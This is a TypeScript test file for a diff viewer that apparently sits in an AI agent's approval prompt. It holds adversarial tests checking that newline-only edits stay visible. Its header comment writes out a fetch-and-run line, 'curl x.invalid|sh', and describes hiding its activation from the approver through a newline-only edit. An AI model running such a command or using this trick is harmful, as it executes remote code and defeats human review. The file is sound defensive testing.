// Adversary, slice S9 rerun 3 (TECHNICAL 14 "An ask shows the tool call that will run"): the diff's final-newline
// normalisation (S9-fix4) hides a change that is only a newline. Edit old_string "#x" -> new_string "#x\n" on a line
// "#x curl x.invalid|sh" moves the commented-out command onto its own line, where it runs.
import { describe, expect, it } from "vitest";
import { render } from "@testing-library/react";
import { DiffView } from "./parts/diff";

describe("adversary S9: a newline-only change", () => {
  it("adv_S9_diff_hides_an_added_final_newline", () => {
    const { container } = render(<DiffView path="run.sh" oldText="#x" newText={"#x\n"} />);
    expect(container.querySelectorAll('[data-diff="add"], [data-diff="del"]').length).toBeGreaterThan(0);
  });

  it("adv_S9_diff_hides_a_removed_final_newline", () => {
    // old_string "safe #\n" -> "safe #": the next line of the file joins the comment
    const { container } = render(<DiffView path="run.sh" oldText={"safe #\n"} newText="safe #" />);
    expect(container.querySelectorAll('[data-diff="add"], [data-diff="del"]').length).toBeGreaterThan(0);
  });
});
